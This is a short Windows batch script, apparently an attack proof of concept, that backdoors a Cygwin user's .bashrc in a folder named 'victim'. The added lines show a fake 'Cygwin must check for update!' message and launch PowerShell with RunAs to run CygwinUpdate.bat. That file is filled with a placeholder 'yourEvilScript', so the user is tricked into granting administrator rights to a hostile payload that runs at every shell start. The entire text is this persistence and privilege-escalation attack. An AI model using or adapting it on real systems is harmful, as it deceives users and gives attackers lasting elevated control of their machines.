cd ..\..\Cygwin64\home\victim
echo echo "Cygwin must check for update!" >> .bashrc
echo /cygdrive/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command "Start-Process c:\users\victim\CygwinUpdate.bat -Verb RunAs" >> .bashrc
echo echo "Cygwin updated!" >> .bashrc
cd ..\..\..\users\victim
echo yourEvilScript > CygwinUpdate.bat
